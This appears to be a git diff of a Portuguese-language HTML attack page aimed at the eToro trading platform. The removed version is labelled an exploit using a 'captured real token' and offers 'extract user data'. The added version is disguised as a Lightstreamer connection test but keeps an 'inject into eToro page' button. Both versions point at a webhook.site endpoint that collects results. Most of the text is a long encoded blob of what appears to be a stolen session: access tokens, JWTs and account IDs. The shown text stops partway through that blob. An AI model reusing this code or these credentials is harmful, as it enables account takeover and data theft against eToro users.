@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eToro - EXPLOIT COMPLETO COM TOKEN REAL</title>
+    <title>Lightstreamer - Deep Connection Test</title>
     <style>
         body {
             background: #0a0a0a;
@@ -11,58 +11,50 @@
             font-family: monospace;
             padding: 20px;
         }
-        .critical { color: #ff00ff; font-weight: bold; }
         .success { color: #00ff00; }
         .error { color: #ff4444; }
         .info { color: #ffaa00; }
+        .critical { color: #ff00ff; }
         .log {
             border-bottom: 1px solid #333;
             padding: 5px;
             margin: 5px 0;
             font-size: 12px;
+            word-break: break-all;
         }
         button {
             background: #2a2a3e;
             color: #00ff00;
             border: 1px solid #00ff00;
-            padding: 10px 20px;
+            padding: 8px 15px;
             margin: 5px;
             cursor: pointer;
         }
-        button.danger {
-            border-color: #ff4444;
-            color: #ff4444;
-        }
-        textarea {
-            width: 100%;
-            height: 150px;
+        .status {
             background: #1a1a2e;
-            color: #00ff00;
-            border: 1px solid #333;
-            font-family: monospace;
             padding: 10px;
             margin: 10px 0;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <h1>🔴 eToro - EXPLOIT COMPLETO</h1>
-    <p class="critical">🎯 TOKEN REAL CAPTURADO! Vamos testar!</p>
+    <h1>🔌 Lightstreamer - Deep Connection Test</h1>
+    <div class="status" id="status">⚡ Pronto para testar</div>
     
     <div>
-        <button onclick="exploitWithToken()">💀 EXPLORAR COM TOKEN REAL</button>
-        <button onclick="testTokenOnWebSocket()">🔌 Testar Token no WebSocket</button>
-        <button onclick="extractUserData()">📊 Extrair Dados do Usuário</button>
-        <button onclick="clearLogs()">🗑️ Limpar</button>
+        <button onclick="testLightstreamerReal()">🌐 TESTE CONEXÃO REAL</button>
+        <button onclick="testWithFullHandshake()">🤝 TESTE HANDSHAKE COMPLETO</button>
+        <button onclick="testControlCommands()">🎮 TESTE COMANDOS CONTROLE</button>
+        <button onclick="injectIntoPage()">💉 INJETAR NA PAGINA ETORO</button>
+        <button onclick="clearLogs()">🗑️ LIMPAR</button>
     </div>
-    
-    <textarea id="tokenInput" placeholder="Cole o token capturado aqui...">eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwidHlwIjoiSldU</textarea>
     
     <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
     
     <script>
         const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
-        let ws = null;
+        let currentWs = null;
         
         function addLog(message, type = 'info') {
             const logs = document.getElementById('logs');
@@ -79,171 +71,196 @@
             }).catch(() => {});
         }
         
-        function exploitWithToken() {
-            let token = document.getElementById('tokenInput').value;
-            if (!token || token === 'eyJhdXRoZW50aWNhdGlvbkRhdGEiOnsiYWNjZXNzVG9rZW4iOiJleUpoYkdjaU9pSmthWElpTENKbGJtTWlPaUpCTWpVMlEwSkRMVWhUTlRFeUlpd2lhMmxrSWpvaU1qZzBPVGdpTENKMGVYQWlPaUpLVjFRaUxDSmpkSGtpT2lKS1YxUWlmUS4uZWRoTVhtN2pXVWhDeVNfZmotMk5uUS5NUk5nVHFNWEZaRmFpSFIxSWxhNUU1SGhjU1FQd2JNTFR0NEh6ZkZNYXhXTmtBN1RqNjlVOC1ueXdLY0hZemNtVE04dldxRFRxSi1TZmRjb1NOcW1rbktVU05SUzNwekQydkNsR3FVYWlDT1NzVlhIQlk4bVhJODR4MVNpSEJFWl90ZUhyRklpMFphTUlfZWZyVVZqNjVuRVVoekl6aWpBRTVxYlZwYW8wVWk4QUVaSlFLc2VLSkd6dE1JNXV0YWlBeXB2WHlIYk5ZYzVmX1ZYZzhxNmtKNkNiVW5ZM3RMSzk3OVhVcGM1VldyRUxUQkRkelFycUpRLV9VWDVpY2N5c19LWVFWVkZ0b1JkVHZSX29LbXlQTjBRbGV3RXNZb0J5UzdPVGgyMFlkZ3VOYjJTWTBvdTdydXFUS0FqZ3NkY1Q1WnEyRzRUNEJnaEtyVGc0am1WdXlreTN0RTkyOXd4TUg3YVVYOUVLeFk4UG1rMkpHSDBiV2h3RGxLcl8zdFBYMVRiMV9HQ2ZiZWtXOE1hcm9XNkpCZnJVOEhTMVhKSTdVUGVOeDcwczdiY0xPVmtaZE5qMGQwaXdNT2RYenZWTHdLWVBLNEhPQktJcHdjLUVWcUR2R0hUeHNncjdXYXFFaW10d3paMVF2eTJjbWtlVi00Szh2azBkR2hzc2pScmdydldkR0xQMW5Zc19HOEo4SlR6aFI3VjJTQTUydm00b3h0Rlo0cm1nRWhON1FUbHpBX2Y4cEJheTdPX2dRMGRWWkNrVXktMmtQN3BDMXRYTGtOMGdkUjU3VWp6VjhIU1JaN0JNRUhLaTRHRXYxVk5RdEcwSmlNMWNOYUZ2Nk9HR2czMnR4LURIdndVaDZWajE0WkF0LUVsMlUtZGotaWpQVTExWk1VMnRfaXA3MTFhclhFMXYtZE9pWjdCUE1HQUZtTU1SRzJmOW1GTjJzbS1CZGNvQ1plUmNLa2VMNlRPMkd3SjZkaTdGeGhtV2FpVnE4TThLRThsRUxWei0xTkhWWjFkWHB3TTAxLUpFMWppWG9mMUx6Vk9yeHVEUlhPNGJJNGZvd0xCX1lZQXdRdDIxUDBYYWNyLUUyZGVuRlR1ejVkUzU2N2djcXA5aXBMR2hFVHlmNnh1dnVDZ1p4N01TT0RZb0ZJendlODRKZ0ZFVk1XblB5MnJyMkJCbnpNeU5uLU9fNkdZc2NGWThWRDBRX2NlSGd1b3BSSHYyNG1rYWRnd3B5M1NsNnAxX3pCdVFiT2NGWU1MbnRTLTZlZ2JCNUo1X3F5YzRrVHVCTVk3eWs3R3JhNlNTRVc3NUliaTJja3R1azhTcGxudDUwTWFwZ1V4ekJ3VVNHNXZlOUZRTFZNbUFOU2VaRmpUbktLZ19HRnlMVTlRLXBWRHN1SzdoN0JINWc4cU5jUGJMaGMxQ0E0RkNXVkNiSnFZTkVaWWM4TXVvSTZyQUJOZ3VvZ2huRUw4X0pBTVotSVd1TjVnNm5hMjJnVDBaVXNGYUJrWkk4aktPMS1DRG82cWNZWEpWZFZyWFN4eWZ2a1Z1UG5yczZrNHFPb3JnUW1uODEtb3pOeDdUOUNDVlF4Y21hdjJudmVqVkp0NkUxV04wZDVmaFNzRkFGSjFETjAtRGY3eDhialJXZDg5NHc0UlVRX0FvT0dVT21PbUtMVkJtb3ZJUGQtT3R0QVM0QmNXVzBWcGhGS2NUVjlYSXBiazJQUzFWYkVMZ2JNUXd4eDRvUVNFcnM2NXRjd0hlNjAuLVd3bG1oVkVvZXhRYi1DWDhUM21MOVVPLU9LejFsbjB6X2paZnd1TFB5TSIsImV4cGlyZXNJbk1zIjoyNTkxOTk5OTg5LCJnY2lkIjo0NzU1NDcxOSwicmVhbENpZCI6NDc1NTAyOTksImRlbW9DaWQiOjQ4NzMzNDE1LCJ0b2tlbiI6eyJqd3QiOiJleUpoYkdjaU9pSmthWElpTENKbGJtTWlPaUpCTWpVMlEwSkRMVWhUTlRFeUlpd2lhMmxrSWpvaU1qZzBPVGdpTENKMGVYQWlPaUpLVjFRaUxDSmpkSGtpT2lKS1YxUWlmUS4uZWRoTVhtN2pXVWhDeVNfZmotMk5uUS5NUk5nVHFNWEZaRmFpSFIxSWxhNUU1SGhjU1FQd2JNTFR0NEh6ZkZNYXhXTmtBN1RqNjlVOC1ueXdLY0hZemNtVE04dldxRFRxSi1TZmRjb1NOcW1rbktVU05SUzNwekQydkNsR3FVYWlDT1NzVlhIQlk4bVhJODR4MVNpSEJFWl90ZUhyRklpMFphTUlfZWZyVVZqNjVuRVVoekl6aWpBRTVxYlZwYW8wVWk4QUVaSlFLc2VLSkd6dE1JNXV0YWlBeXB2WHlIYk5ZYzVmX1ZYZzhxNmtKNkNiVW5ZM3RMSzk3OVhVcGM1VldyRUxUQkRkelFycUpRLV9VWDVpY2N5c19LWVFWVkZ0b1JkVHZSX29LbXlQTjBRbGV3RXNZb0J5UzdPVGgyMFlkZ3VOYjJTWTBvdTdydXFUS0FqZ3NkY1Q1WnEyRzRUNEJnaEtyVGc0am1WdXlreTN0RTkyOXd4TUg3YVVYOUVLeFk4UG1rMkpHSDBiV2h3RGxLcl8zdFBYMVRiMV9HQ2ZiZWtXOE1hcm9XNkpCZnJVOEhTMVhKSTdVUGVOeDcwczdiY0xPVmtaZE5qMGQwaXdNT2RYenZWTHdLWVBLNEhPQktJcHdjLUVWcUR2R0hUeHNncjdXYXFFaW10d3paMVF2eTJjbWtlVi00Szh2azBkR2hzc2pScmdydldkR0xQMW5Zc19HOEo4SlR6aFI3VjJTQTUydm00b3h0Rlo0cm1nRWhON1FUbHpBX2Y4cEJheTdPX2dRMGRWWkNrVXktMmtQN3BDMXRYTGtOMGdkUjU3VWp6VjhIU1JaN0JNRUhLaTRHRXYxVk5RdEcwSmlNMWNOYUZ2Nk9HR2czMnR4LURIdndVaDZWajE0WkF0LUVsMlUtZGotaWpQVTExWk1VMnRfaXA3MTFhclhFMXYtZE9pWjdCUE1HQUZtTU1SRzJmOW1GTjJzbS1CZGNvQ1plUmNLa2VMNlRPMkd3SjZkaTdGeGhtV2FpVnE4TThLRThsRUxWei0xTkhWWjFkWHB3TTAxLUpFMWppWG9mMUx6Vk9yeHVEUlhPNGJJNGZvd0xCX1lZQXdRdDIxUDBYYWNyLUUyZGVuRlR1ejVkUzU2N2djcXA5aXBMR2hFVHlmNnh1dnVDZ1p4N01TT0RZb0ZJendlODRKZ0ZFVk1XblB5MnJyMkJCbnpNeU5uLU9fNkdZc2NGWThWRDBRX2NlSGd1b3BSSHYyNG1rYWRnd3B5M1NsNnAxX3pCdVFiT2NGWU1MbnRTLTZlZ2JCNUo1X3F5YzRrVHVCTVk3eWs3R3JhNlNTRVc3NUliaTJja3R1azhTcGxudDUwTWFwZ1V4ekJ3VVNHNXZlOUZRTFZNbUFOU2VaRmpUbktLZ19HRnlMVTlRLXBWRHN1SzdoN0JINWc4cU5jUGJMaGMxQ0E0RkNXVkNiSnFZTkVaWWM4TXVvSTZyQUJOZ3VvZ2huRUw4X0pBTVotSVd1TjVnNm5hMjJnVDBaVXNGYUJrWkk4aktPMS1DRG82cWNZWEpWZFZyWFN4eWZ2a1Z1UG5yczZrNHFPb3JnUW1uODEtb3pOeDdUOUNDVlF4Y21hdjJudmVqVkp0NkUxV04wZDVmaFNzRkFGSjFETjAtRGY3eDhialJXZDg5NHc0UlVRX0FvT0dVT21PbUtMVkJtb3ZJUGQtT3R0QVM0QmNXVzBWcGhGS2NUVjlYSXBiazJQUzFWYkVMZ2JNUXd4eDRvUVNFcnM2NXRjd0hlNjAuLVd3bG1oVkVvZXhRYi1DWDhUM21MOVVPLU9LejFsbjB6X2paZnd1TFB5TSIsImV4cGlyZXNJbk1zIjoyNTkxOTk5OTg5fSwiZXhwaXJhdGlvblVuaXhUaW1lTXMiOjE3Nzg2MzQ3ODYxNTZ9LCJzdHNEYXRhX2FwcF8xIjp7InN0YXR1c0NvZGUiOiJDcmVhdGVkIiwiZ2NpZCI6NDc1NTQ3MTksInJlYWxDaWQiOjQ3NTUwMjk5LCJkZW1vQ2lkIjo0ODczMzQxNSwib0F1dGhVc2VySWQiOiJIY3pRRUQtZ1ZaQ0lSVndXMnVXbHBIeXlhdDBNeFMycnVoNjZYZFJ3cUJUaENmYzgtYUtBdVljdTRPeGJLVVVveXRDZmh2SzlJLUFaZ3R3YjkwdjllQV9fIiwidG9rZW4iOnsiand0IjoiZXlKaGJHY2lPaUprYVhJaUxDSmxibU1pT2lKQk1qVTJRMEpETFVoVE5URXlJaXdpYTJsa0lqb2lNamcwT1RnaUxDSjBlWEFpT2lKS1YxUWlMQ0pqZEhraU9pSktWMVFpZlEuLnhVSENFZ2pDUThJTGw3LXZGbE9NUncuWnJIWW9scmlhbkMyYWJUcm5DLWJIRTVxZUFzeUtFNHFYUF9hbVhfVDVIS2paT0ExS1lGT2M5WjJSbTNYREhsYnJMZ0F1Y2NlVDd4bUc4dWtqaWtKN3JsSm9Ea1ZsSmMxaVlieHRic3hLdFFzLXY0QUJwUVhuRlNZc2J6U0JZckEyY3NNS1Z5aXhCVEVlT0VDYlo5NWNpS3M1YzRydlZrSFAwS0ZReWkwbFB3Q1hyclNYTHZhM3RWdVZ3a1k5ZTA3aWt3cm5URFExTmRFazMxejZxWXk3SVJERmE3UmxaTzZoeGlqQzNyMVRBTzBkQ2dNY094S21mcXNsd1dhbndlUFBtUjU4S01INFF1bUFuY1N2VnZ0QVloMFlINjZ5S2otS3FZbmpXNDR4OWFzb256WEljc0U4SU5jUzdwR2FjdVFRS2wxdnJscWFmWkVGTzVzX1ZLczQtVXI4clJWb2hoM1MxZTF5N1laQXdILXlpSldwUG5LVWhUWlRoX0N5T0tLQ1FWbThHQzNDX0MzLUJ5a2NmYXJFVTJGZ3BBaWNLWEZJMkJJYlNrMWQ0bDh5Y3lNR1JMRkg3bV9obktveWFabHdJQU1QdS10ajM4Vi1mQVhBWG9BU0xKNzROcG5aeV9JMmw2X01hSVUxeDdJN09Gc3duQm51QjdxaDJSbURPTUJybjJ3c3hSYWVwa0NrclBuZ3YyNHBQR2dDQldGN3dKVmtjMDFPX1BoRXZZaDNmVDdIX0VzbzA1R0wzQ0NqME9ta05fWVZsOG1TdEhQdTJkTUlWOWRsalYyeWhuNDlYWXBmVkpORk5lUWIxY1pBeWhmMV9lQ0NnTElMWXhoWVBRSWJMZk1NNjZ4SVRCZ0QtaUFtMXk0Nl9IU1lhQWFYbHQ3MWE2d1hwRzRpaXduREJ6SVlEQzFHaWJsdVlrc182ZVhQRlVnMjNKSmVVNW9JTHZkQVpENXpfTTVNRnJBejdpeWxTMll6VjVNZEFlbjZPcGtrV0hPY2ZVLTBkNGkyenEtSEFsMGFhQ3pXTU93TW52UGVtM2hoTHNiYWMwZzBidWh0VjgxVkI0Y1liTXN0TVNCQ0pWdE1VSjR0M3ZGUDByUEZ6bnhXRnRCUy1CYzN5bW9GVFpSdUZFd1FqOFFPcFY1bG9qT0hTZ1h1enlJcVVwNnhFeXQzMmxfdkloTXY3VTFOQTJEUVJLSFg5WlhCVDd3dWRFRzVfaEE1c01oM3pGUjlSRU9VbHkxUWUtbENkU1hJZk1wVVBRV1VObHRnZy1lMzVoak9XVnFIOU5HYm05bmw1OUlaaFNHYVlaN2tlemMzc2wydmhFQ2VkT0dVMEpoYWo0UVpHY1ZmZmxQZjdpSUJielEweng4Q0VzdnJyM0JHUlBNalctZlFiQW56UEtoME8wdTNrN1dXMVBfc2NLWlpJRkNUMGtxVllrS1dnRHYtWEhzcGhjc3FIQTZyUWVhdUIxYXBUZlJpSnBZWkFsX3dtZ1ByOHpMUGdvLUFvYUlWVGEyeUQzbzlLaVN4a2l5eEJlWVg0ZjR2Nm9laTdNY0t1eXd6Y3hieFNsNGxCUDI3NGszWi1Oa1FjcXZjTXdRbXFvb052UEluXzlUcEdkM1JOSlpXZFY4R1VnMzd6NTdPcTI3T1J1TG5YSDJIVzFkUHFJc005Um5pQS00WmJKa2Y3N2VyZ0t1Y3RSeUtkQWI3UDlsRW5xU3pZU2N1aEtoaXJKc2otQTBqN19fb2sydktjMDRuT2VJSnJEOHdCYWp1ZnJKdWlkOXhvYU9qNUo4bzdWckhHWGJyZHl4RXJaRC1uczdodDVMX3Nxb3pzMmlpTEg0MXp6QjlpTmwyb3Y0T2tUN2lxaW00ZFZuRGZUSm1VUHEwUjhYSFRVMF9OMi1JMnB5dTFvTmt3QXJ2b1BJT0lwbU1mMEpPTFJHN2hBXzRqY21INV9IRjljdk01Mnh4TlZXTW16ZTFSUkhfa0lrd0hDaDJ6VjdsRDhwRVpCSkh6RWFQQUVleG5yaFFpOW5SZHNSZzY0U25TWFYxUm84TkRkZXo5QW45SGU3VVdBOTJKODJIek9jR2RZdnhUallISEdIaGRna3pfZy4yaXd6MUZKTlUyblN0OGppcGJRXzZybXl4aGVxRlhrTjA3Ry1YWjhoZDlNIiwiZXhwaXJlc0luTXMiOjg2NDAwMDAwfSwiYWNjZXNzVG9rZW4iOiJleUpoYkdjaU9pSmthWElpTENKbGJtTWlPaUpCTWpVMlEwSkRMVWhUTlRFeUlpd2lhMmxrSWpvaU1qZzBPVGdpTENKMGVYQWlPaUpLVjFRaUxDSmpkSGtpT2lKS1YxUWlmUS4ueFVIQ0VnakNROElMbDctdkZsT01Sdy5ackhZb2xyaWFuQzJhYlRybkMtYkhFNXFlQXN5S0U0cVhQX2FtWF9UNUhLalpPQTFLWUZPYzlaMlJtM1hESGxickxnQXVjY2VUN3htRzh1a2ppa0o3cmxKb0RrVmxKYzFpWWJ4dGJzeEt0UXMtdjRBQnBRWG5GU1lzYnpTQllyQTJjc01LVnlpeEJURWVPRUNiWjk1Y2lLczVjNHJ2VmtIUDBLRlF5aTBsUHdDWHJyU1hMdmEzdFZ1VndrWTllMDdpa3dyblREUTFOZEVrMzF6NnFZeTdJUkRGYTdSbFpPNmh4aWpDM3IxVEFPMGRDZ01jT3hLbWZxc2x3V2Fud2VQUG1SNThLTUg0UXVtQW5jU3ZWdnRBWWgwWUg2NnlLai1LcVlualc0NHg5YXNvbnpYSWNzRThJTmNTN3BHYWN1UVFLbDF2cmxxYWZaRUZPNXNfVktzNC1VcjhyUlZvaGgzUzFlMXk3WVpBd0gteWlKV3BQbktVaFRaVGhfQ3lPS0tDUVZtOEdDM0NfQzMtQnlrY2ZhckVVMkZncEFpY0tYRkkyQkliU2sxZDRsOHljeU1HUkxGSDdtX2huS295YVpsd0lBTVB1LXRqMzhWLWZBWEFYb0FTTEo3NE5wblp5X0kybDZfTWFJVTF4N0k3T0Zzd25CbnVCN3FoMlJtRE9NQnJuMndzeFJhZXBrQ2tyUG5ndjI0cFBHZ0NCV0Y3d0pWa2MwMU9fUGhFdlloM2ZUN0hfRXNvMDVHTDNDQ2owT21rTl9ZVmw4bVN0SFB1MmRNSVY5ZGxqVjJ5aG40OVhZcGZWSk5GTmVRYjFjWkF5aGYxX2VDQ2dMSUxZeGhZUFFJYkxmTU02NnhJVEJnRC1pQW0xeTQ2X0hTWWFBYVhsdDcxYTZ3WHBHNGlpd25EQnpJWURDMUdpYmx1WWtzXzZlWFBGVWcyM0pKZVU1b0lMdmRBWkQ1el9NNU1GckF6N2l5bFMyWXpWNU1kQWVuNk9wa2tXSE9jZlUtMGQ0aTJ6cS1IQWwwYWFDeldNT3dNbnZQZW0zaGhMc2JhYzBnMGJ1aHRWODFWQjRjWWJNc3RNU0JDSlZ0TVVKNHQzdkZQMHJQRnpueFdGdEJTLUJjM3ltb0ZUWlJ1RkV3UWo4UU9wVjVsb2pPSFNnWHV6eUlxVXA2eEV5dDMybF92SWhNdjdVMU5BMkRRUktIWDlaWEJUN3d1ZEVHNV9oQTVzTWgzekZSOVJFT1VseTFRZS1sQ2RTWElmTXBVUFFXVU5sdGdnLWUzNWhqT1dWcUg5TkdibTlubDU5SVpoU0dhWVo3a2V6YzNzbDJ2aEVDZWRPR1UwSmhhajRRWkdjVmZmbFBmN2lJQmJ6UTB6eDhDRXN2cnIzQkdSUE1qVy1mUWJBbnpQS2gwTzB1M2s3V1cxUF9zY0taWklGQ1Qwa3FWWWtLV2dEdi1YSHNwaGNzcUhBNnJRZWF1QjFhcFRmUmlKcFlaQWxfd21nUHI4ekxQZ28tQW9hSVZUYTJ5RDNvOUtpU3hraXl4QmVZWDRmNHY2b2VpN01jS3V5d3pjeGJ4U2w0bEJQMjc0azNaLU5rUWNxdmNNd1FtcW9vTnZQSW5fOVRwR2QzUk5KWldkVjhHVWczN3o1N09xMjdPUnVMblhIMkhXMWRQcUlzTTlSbmlBLTRaYkprZjc3ZXJnS3VjdFJ5S2RBYjdQOWxFbnFTellTY3VoS2hpckpzai1BMGo3X19vazJ2S2MwNG5PZUlKckQ4d0JhanVmckp1aWQ5eG9hT2o1SjhvN1ZySEdYYnJkeXhFclpELW5zN2h0NUxfc3FvenMyaWlMSDQxenpCOWlObDJvdjRPa1Q3aXFpbTRkVm5EZlRKbVVQcTBSOFhIVFUwX04yLUkycHl1MW9Oa3dBcnZvUElPSXBtTWYwSk9MUkc3aEFfNGpjbUg1X0hGOWN2TTUyeHhOVldNbXplMVJSSF9rSWt3SENoMnpWN2xEOHBFWkJKSHpFYVBBRWV4bnJoUWk5blJkc1JnNjRTblNYVjFSbzhORGRlejlBbjlIZTdVV0E5Mko4Mkh6T2NHZFl2eFRqWUhIR0hoZGdrel9nLjJpd3oxRkpOVTJuU3Q4amlwYlFfNnJteXhoZXFGWGtOMDdHLVhaOGhkOU0iLCJleHBpcmVzSW5NcyI6ODY0MDAwMDAsImFudGlDc3JmVG9rZW4iOiIiLCJleHBpcmF0aW9uVW5peFRpbWVNcyI6MTc3NjEyOTI0NjY3Mn0sInN0c0RhdGEiOnsic3RhdHVzQ29kZSI6IkNyZWF0ZWQiLCJnY2lkIjo0NzU1NDcxOSwicmVhbENpZCI6NDc1NTAyOTksImRlbW9DaWQiOjQ4NzMzNDE1LCJvQXV0aFVzZXJJZCI6IkhjelFFRC1nVlpDSVJWd1cydVdscEh5eWF0ME14UzJydWg2NlhkUndxQlRoQ2ZjOC1hS0F1WWN1NE94YktVVW95dENmaHZLOUktQVpndHdiOTB2OWVBX18iLCJ0b2tlbiI6eyJqd3QiOiJleUpoYkdjaU9pSmthWElpTENKbGJtTWlPaUpCTWpVMlEwSkRMVWhUTlRFeUlpd2lhMmxrSWpvaU1qZzBPVGdpTENKMGVYQWlPaUpLVjFRaUxDSmpkSGtpT2lKS1YxUWlmUS4ueFVIQ0VnakNROElMbDctdkZsT01Sdy5ackhZb2xyaWFuQzJhYlRybkMtYkhFNXFlQXN5S0U0cVhQX2FtWF9UNUhLalpPQTFLWUZPYzlaMlJtM1hESGxickxnQXVjY2VUN3htRzh1a2ppa0o3cmxKb0RrVmxKYzFpWWJ4dGJzeEt0UXMtdjRBQnBRWG5GU1lzYnpTQllyQTJjc01LVnlpeEJURWVPRUNiWjk1Y2lLczVjNHJ2VmtIUDBLRlF5aTBsUHdDWHJyU1hMdmEzdFZ1VndrWTllMDdpa3dyblREUTFOZEVrMzF6NnFZeTdJUkRGYTdSbFpPNmh4aWpDM3IxVEFPMGRDZ01jT3hLbWZxc2x3V2Fud2VQUG1SNThLTUg0UXVtQW5jU3ZWdnRBWWgwWUg2NnlLai1LcVlualc0NHg5YXNvbnpYSWNzRThJTmNTN3BHYWN1UVFLbDF2cmxxYWZaRUZPNXNfVktzNC1VcjhyUlZvaGgzUzFlMXk3WVpBd0gteWlKV3BQbktVaFRaVGhfQ3lPS0tDUVZtOEdDM0NfQzMtQnlrY2ZhckVVMkZncEFpY0tYRkkyQkliU2sxZDRsOHljeU1HUkxGSDdtX2huS295YVpsd0lBTVB1LXRqMzhWLWZBWEFYb0FTTEo3NE5wblp5X0kybDZfTWFJVTF4N0k3T0Zzd25CbnVCN3FoMlJtRE9NQnJuMndzeFJhZXBrQ2tyUG5ndjI0cFBHZ0NCV0Y3d0pWa2MwMU9fUGhFdlloM2ZUN0hfRXNvMDVHTDNDQ2owT21rTl9ZVmw4bVN0SFB1MmRNSVY5ZGxqVjJ5aG40OVhZcGZWSk5GTmVRYjFjWkF5aGYxX2VDQ2dMSUxZeGhZUFFJYkxmTU02NnhJVEJnRC1pQW0xeTQ2X0hTWWFBYVhsdDcxYTZ3WHBHNGlpd25EQnpJWURDMUdpYmx1WWtzXzZlWFBGVWcyM0pKZVU1b0lMdmRBWkQ1el9NNU1GckF6N2l5bFMyWXpWNU1kQWVuNk9wa2tXSE9jZlUtMGQ0aTJ6cS1IQWwwYWFDeldNT3dNbnZQZW0zaGhMc2JhYzBnMGJ1aHRWODFWQjRjWWJNc3RNU0JDSlZ0TVVKNHQzdkZQMHJQRnpueFdGdEJTLUJjM3ltb0ZUWlJ1RkV3UWo4UU9wVjVsb2pPSFNnWHV6eUlxVXA2eEV5dDMybF92SWhNdjdVMU5BMkRRUktIWDlaWEJUN3d1ZEVHNV9oQTVzTWgzekZSOVJFT1VseTFRZS1sQ2RTWElmTXBVUFFXVU5sdGdnLWUzNWhqT1dWcUg5TkdibTlubDU5SVpoU0dhWVo3a2V6YzNzbDJ2aEVDZWRPR1UwSmhhajRRWkdjVmZmbFBmN2lJQmJ6UTB6eDhDRXN2cnIzQkdSUE1qVy1mUWJBbnpQS2gwTzB1M2s3V1cxUF9zY0taWklGQ1Qwa3FWWWtLV2dEdi1YSHNwaGNzcUhBNnJRZWF1QjFhcFRmUmlKcFlaQWxfd21nUHI4ekxQZ28tQW9hSVZUYTJ5RDNvOUtpU3hraXl4QmVZWDRmNHY2b2VpN01jS3V5d3pjeGJ4U2w0bEJQMjc0azNaLU5rUWNxdmNNd1FtcW9vTnZQSW5fOVRwR2QzUk5KWldkVjhHVWczN3o1N09xMjdPUnVMblhIMkhXMWRQcUlzTTlSbmlBLTRaYkprZjc3ZXJnS3VjdFJ5S2RBYjdQOWxFbnFTellTY3VoS2hpckpzai1BMGo3X19vazJ2S2MwNG5PZUlKckQ4d0JhanVmckp1aWQ5eG9hT2o1SjhvN1ZySEdYYnJkeXhFclpELW5zN2h0NUxfc3FvenMyaWlMSDQxenpCOWlObDJvdjRPa1Q3aXFpbTRkVm5EZlRKbVVQcTBSOFhIVFUwX04yLUkycHl1MW9Oa3dBcnZvUElPSXBtTWYwSk9MUkc3aEFfNGpjbUg1X0hGOWN2TTUyeHhOVldNbXplMVJSSF9rSWt3SENoMnpWN2xEOHBFWkJKSHpFYVBBRWV4bnJoUWk5blJkc1JnNjRTblNYVjFSbzhORGRlejlBbjlIZTdVV0E5Mko4Mkh6T2NHZFl2eFRqWUhIR0hoZGdrel9nLjJpd3oxRkpOVTJuU3Q4amlwYlFfNnJteXhoZXFGWGtOMDdHLVhaOGhkOU0iLCJleHBpcmVzSW5NcyI6ODY0MDAwMDB9LCJhY2Nlc3NUb2tlbiI6ImV5SmhiR2NpT2lKa2FYSWlMQ0psYm1NaU9pSkJNalUyUTBKRExVaFROVEV5SWl3aWEybGtJam9pTWpnME9UZ2lMQ0owZVhBaU9pSktWMVFpTENKamRIa2lPaUpLVjFRaWZRLi54VUhDRWdqQ1E4SUxsNy12RmxPTVJ3LlpySFlvbHJpYW5DMmFiVHJuQy1iSEU1cWVBc3lLRTRxWFBfYW1YX1Q1SEtqWk9BMUtZRk9jOVoyUm0zWERIbGJyTGdBdWNjZVQ3eG1HOHVramlrSjdybEpvRGtWbEpjMWlZYnh0YnN4S3RRcy12NEFCcFFYbkZTWXNielNCWXJBMmNzTUtWeWl4QlRFZU9FQ2JaOTVjaUtzNWM0cnZWa0hQMEtGUXlpMGxQd0NYcnJTWEx2YTN0VnVWd2tZOWUwN2lrd3JuVERRMU5kRWszMXo2cVl5N0lSREZhN1JsWk82aHhpakMzcjFUQU8wZENnTWNPeEttZnFzbHdXYW53ZVBQbVI1OEtNSDRRdW1BbmNTdlZ2dEFZaDBZSDY2eUtqLUtxWW5qVzQ0eDlhc29uelhJY3NFOElOY1M3cEdhY3VRUUtsMXZybHFhZlpFRk81c19WS3M0LVVyOHJSVm9oaDNTMWUxeTdZWkF3SC15aUpXcFBuS1VoVFpUaF9DeU9LS0NRVm04R0MzQ19DMy1CeWtjZmFyRVUyRmdwQWljS1hGSTJCSWJTazFkNGw4eWN5TUdSTEZIN21faG5Lb3lhWmx3SUFNUHUtdGozOFYtZkFYQVhvQVNMSjc0TnBuWnlfSTJsNl9NYUlVMXg3STdPRnN3bkJudUI3cWgyUm1ET01Ccm4yd3N4UmFlcGtDa3JQbmd2MjRwUEdnQ0JXRjd3SlZrYzAxT19QaEV2WWgzZlQ3SF9Fc28wNUdMM0NDajBPbWtOX1lWbDhtU3RIUHUyZE1JVjlkbGpWMnlobjQ5WFlwZlZKTkZOZVFiMWNaQXloZjFfZUNDZ0xJTFl4aFlQUUliTGZNTTY2eElUQmdELWlBbTF5NDZfSFNZYUFhWGx0NzFhNndYcEc0aWl3bkRCeklZREMxR2libHVZa3NfNmVYUEZVZzIzSkplVTVvSUx2ZEFaRDV6X001TUZyQXo3aXlsUzJZelY1TWRBZW42T3Bra1dIT2NmVS0wZDRpMnpxLUhBbDBhYUN6V01Pd01udlBlbTNoaExzYmFjMGcwYnVodFY4MVZCNGNZYk1zdE1TQkNKVnRNVUo0dDN2RlAwclBGem54V0Z0QlMtQmMzeW1vRlRaUnVGRXdRajhRT3BWNWxvak9IU2dYdXp5SXFVcDZ4RXl0MzJsX3ZJaE12N1UxTkEyRFFSS0hYOVpYQlQ3d3VkRUc1X2hBNXNNaDN6RlI5UkVPVWx5MVFlLWxDZFNYSWZNcFVQUVdVTmx0Z2ctZTM1aGpPV1ZxSDlOR2JtOW5sNTlJWmhTR2FZWjdrZXpjM3NsMnZoRUNlZE9HVTBKaGFqNFFaR2NWZmZsUGY3aUlCYnpRMHp4OENFc3ZycjNCR1JQTWpXLWZRYkFuelBLaDBPMHUzazdXVzFQX3NjS1paSUZDVDBrcVZZa0tXZ0R2LVhIc3BoY3NxSEE2clFlYXVCMWFwVGZSaUpwWVpBbF93bWdQcjh6TFBnby1Bb2FJVlRhMnlEM285S2lTeGtpeXhCZVlYNGY0djZvZWk3TWNLdXl3emN4YnhTbDRsQlAyNzRrM1otTmtRY3F2Y013UW1xb29OdlBJbl85VHBHZDNSTkpaV2RWOEdVZzM3ejU3T3EyN09SdUxuWEgySFcxZFBxSXNNOVJuaUEtNFpiSmtmNzdlcmdLdWN0UnlLZEFiN1A5bEVucVN6WVNjdWhLaGlySnNqLUEwajdfX29rMnZLYzA0bk9lSUpyRDh3QmFqdWZySnVpZDl4b2FPajVKOG83VnJIR1hicmR5eEV